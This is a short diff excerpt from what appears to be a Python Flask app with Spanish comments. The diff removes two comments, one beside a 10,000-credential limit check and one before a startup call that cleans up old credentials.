-    # Límite de operaciones (prevenir sobrecarga)
     if get_credentials_count() > 10000:
         return jsonify({'error': 'Demasiadas credenciales. Usa eliminación manual.'}), 400
     
@@ -836,7 +1048,6 @@ if __name__ == '__main__':
     load_config()
     init_db()
     
-    # Limpiar credenciales antiguas al iniciar
     cleanup_old_credentials()
     
     port = int(os.environ.get('PORT', 8080))
